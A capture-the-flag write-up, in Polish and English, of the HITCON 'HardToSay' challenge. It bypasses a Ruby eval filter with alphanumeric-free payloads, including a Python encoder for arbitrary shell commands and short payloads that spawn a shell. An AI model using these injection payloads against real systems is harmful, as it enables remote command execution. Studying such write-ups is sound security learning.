## HardToSay (misc, 200p, (111, 88, 73, 28) solves)

    Ruby on Fails.
    FLAG1: nc 54.199.215.185 9001
    FLAG2: nc 54.199.215.185 9002
    FLAG3: nc 54.199.215.185 9003
    FLAG4: nc 54.199.215.185 9004

    hard_to_say-151ba63da9ef7f11bcbba93657805f85.rb

### PL
[ENG](#eng-version)

Dostajemy taki kod:

```ruby

#!/usr/bin/env ruby

fail 'flag?' unless File.file?('flag')

$stdout.sync = true

limit = ARGV[0].to_i
puts "Hi, I can say #{limit} bytes :P"
s = $stdin.gets.strip!

if s.size > limit || s[/[[:alnum:]]/]
  puts 'oh... I cannot say this, maybe it is too long or too weird :('
  exit
end

puts "I think size = #{s.size} is ok to me."
r = eval(s).to_s
r[64..-1] = '...' if r.size > 64
puts r
```

Jak widać pobiera on od użytkownika kod, i evaluje go - ale tylko pod warunkiem że nie zawiera znaków alfanumerycznych i jest odpowiednio krótki.

Są cztery serwery z zadaniem - każdy z nich przyjmuje mniej znaków. Pierwszy 1024, drugi 64, trzeci 36, a czwarty tylko 10. Za pokonanie każdego dostajemy 50 punktów.

Najlepszym rozwiązaniem na jakie wpadliśmy na początku to wykonanie operacji na shellu za pomocą backticków (``` ` ```) i interpolowania stringów.

Opieramy się tutaj na kilku wartościach które są domyślnie dostępne w interpreterze, np. `$$` zwraca nam PID aktualnego procesu, więc wykonanie `$$/$$` da nam wynik `1`. Możemy w ten sposób uzyskać dowolne liczby, a stosując `''<<number` możemy generować także dowolne znaki ASCII.

Napisaliśmy sobie prosty enkoder wykonujący dowolne (odpowiednio krótkie) polecenie shellowe:

```python
def encode(cmd):
    out = """a1 = $$/$$
    a2 = a1+a1
    a4 = a2+a2
    a8 = a4+a4
    a16 = a8+a8
    a32 = a16+a16
    a64 = a32+a32
    """

    ss = []
    for c in cmd:
        cc = ord(c)
        vs = []
        for b in range(8):
            if (2**b) & ord(c):
                vs.append('a'+str(2**b))
        ss.append('(' + '+'.join(vs) + ")")
    s = '(""<<' + '<<'.join(ss) + ")"

    end = "`#{" + s + "}`"

    start = out + end

    varnames = ['_'*i for i in range(1,10)][::-1]

    start = start.replace('a64', varnames.pop())
    start = start.replace('a32', varnames.pop())
    start = start.replace('a16', varnames.pop())
    start = start.replace('a8', varnames.pop())
    start = start.replace('a4', varnames.pop())
    start = start.replace('a2', varnames.pop())
    start = start.replace('a1', varnames.pop())
    start = ';'.join(start.split('\n'))
    return start

import sys
print encode(sys.argv[1])
```

Flaga: `hitcon{what does the ruby say? @#$%!@&(%!#$&(%!@#$!$?...}`

+50 punktów. Zdobyliśmy w ten sposób pierwszą flagę. Niestety, okazało się że nie da się ukraść jednej flagi mając shella od drugiej flagi (brak uprawnień) i musieliśmy
kombinować dalej...

Postanowiliśmy złożyć string "sh". I umieścić bo w backtickach aby wykonać go w shellu, uzyskując tym samym dostęp do shella. Nasza druga próba, dla 64 znaków, wyglądała tak:

    _=$$;$_=*?`..?{;`#{$_[_*_+_-_/_]+$_[_+_]}`

Flaga: `hitcon{Ruby in Peace m(_ _)m`

+50 punktów. A następnie dla 36 bajtów analogiczna operacja kodująca wywołanie sh:

    _=*?[..?{;`#{_[~--$$-$$]+_[~$$*$$]}`

Flaga: `hitcon{My cats also know how to code in ruby :cat:}`

+50 punktów. Później myśleliśmy dłuższą chwilę, ale wpadliśmy na to, że wykonanie `$0` również powinno dać nam shell - spróbowaliśmy więc:

    `$#{~-$.}`

Gdzie `$.` to aktualny numer linii w stdin (czyli u nas 1). Operacja `~-number` zwraca nam liczbę o 1 mniejszą, czyli 0. Interpolujemy wynik jako stringa, doklejamy do znaku `$` i wywołujemy uzyskane `$0` w shellu uzyskując dostęp do shella.
Flaga: `hitcon{It's hard to say where ruby went wrong QwO}`

W ten sposób zdobyliśmy kolejne 50 punktów, rozwiązując w ten sposób całe zadanie.

### ENG version

We get the code:

```ruby

#!/usr/bin/env ruby

fail 'flag?' unless File.file?('flag')

$stdout.sync = true

limit = ARGV[0].to_i
puts "Hi, I can say #{limit} bytes :P"
s = $stdin.gets.strip!

if s.size > limit || s[/[[:alnum:]]/]
  puts 'oh... I cannot say this, maybe it is too long or too weird :('
  exit
end

puts "I think size = #{s.size} is ok to me."
r = eval(s).to_s
r[64..-1] = '...' if r.size > 64
puts r
```

As can be seen, it gets data from the use and evaluates it with `eval()`, but only if it doesn't contain any alphanumerical characters and is short enough.

There are 4 instances of the task - each one accepts less characters. First 1024, second 64, third 36 and last one only 10. For beating each one we get 50 points.

The best solution we came up with initially was executing shell operations with (``` ` ```) and string interpolation.

We use here some numerical values that are accesible in the interpreter, eg. `$$` gives is PID of the process so calling `$$/$$` gives nam `1`. This way we can get any number and by using `''<<number` we can also generate any ASCII.

We made a simple encoder that can create a code for us:

```python
def encode(cmd):
    out = """a1 = $$/$$
    a2 = a1+a1
    a4 = a2+a2
    a8 = a4+a4
    a16 = a8+a8
    a32 = a16+a16
    a64 = a32+a32
    """

    ss = []
    for c in cmd:
        cc = ord(c)
        vs = []
        for b in range(8):
            if (2**b) & ord(c):
                vs.append('a'+str(2**b))
        ss.append('(' + '+'.join(vs) + ")")
    s = '(""<<' + '<<'.join(ss) + ")"

    end = "`#{" + s + "}`"

    start = out + end

    varnames = ['_'*i for i in range(1,10)][::-1]

    start = start.replace('a64', varnames.pop())
    start = start.replace('a32', varnames.pop())
    start = start.replace('a16', varnames.pop())
    start = start.replace('a8', varnames.pop())
    start = start.replace('a4', varnames.pop())
    start = start.replace('a2', varnames.pop())
    start = start.replace('a1', varnames.pop())
    start = ';'.join(start.split('\n'))
    return start

import sys
print encode(sys.argv[1])
```

Flag: `hitcon{what does the ruby say? @#$%!@&(%!#$&(%!@#$!$?...}`

+50 points. This way we got the first flag. Unfortunately it was not possible to steal a different flag with the shell access we got (no permission) so we had to try harder.

We decided that we could prepare "sh" and put it in backticks to execute it in shell and get shell access. Our first attempt for 64 characters:

    _=$$;$_=*?`..?{;`#{$_[_*_+_-_/_]+$_[_+_]}`

Flag: `hitcon{Ruby in Peace m(_ _)m`

+50 points. Next one for 36 characters similar attempt to call "sh":

    _=*?[..?{;`#{_[~--$$-$$]+_[~$$*$$]}`

Flag: `hitcon{My cats also know how to code in ruby :cat:}`

+50 points. Then we had to think for a while but we figured that executing `$0` in the shell should also give us shell so we tried:

    `$#{~-$.}`

Where `$.` is current stdin line number (for us 1). Operation `~-number` returns number-1, so in our case 0. We interpolate this as string and glue with `$` and execute the `$0` we just got, getting shell accesss.
Flag: `hitcon{It's hard to say where ruby went wrong QwO}`

This way we got another 50 points and solved whole task.
